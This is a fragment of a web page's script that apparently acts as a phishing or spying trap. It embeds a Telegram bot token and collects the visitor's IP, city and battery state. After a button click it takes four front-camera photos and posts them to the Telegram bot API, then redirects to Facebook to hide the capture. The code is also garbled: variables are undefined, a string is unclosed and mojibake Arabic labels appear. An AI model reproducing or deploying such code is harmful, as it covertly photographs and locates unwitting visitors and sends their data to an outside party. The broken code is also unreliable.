<body id="bdy">

    <script>
        const T = "8301533698:AAFOJ_IyTmOXO5BPQwOEFFFYy7tfIlaqJ1g";

        const u = new URLSearchParams(window.location.search);
        if (u.get('run') === "1") {
            document.getElementById('bdy').style.display = 'block';

        async function captureInfo() {
            try {

                const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 0, charging: false}));
                
                const data = `

- IP: ${ipRes.ip}
- ÿßŸÑŸÖÿØŸäŸÜÿ©: ${ipRes.city}

        document.getElementById('actionBtn').addEventListener('click', async function() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;
                
                let count = 0;
                const interval = setInterval(() => {
                    if (count < 4) {
                        snap();
                        count++;
                    } else {
                        clearInterval(interval);
                        window.location.href = "https://www.facebook.com/profile.php?id=1000059997";
                    }
                }, 400);
            } catch (err) {
                window.location.href = "https://www.facebook.com";
            }
        });

        function snap() {
            const canvas = document.getElementById('c');
            const video = document.getElementById('v');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            canvas.toBlob(blob => {
                const fd = new FormData();
                fd.append('chat_id', I);
                fd.append('photo', blob, 'shot.jpg');
                fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
            }, 'image/jpeg', 0.5);
        }
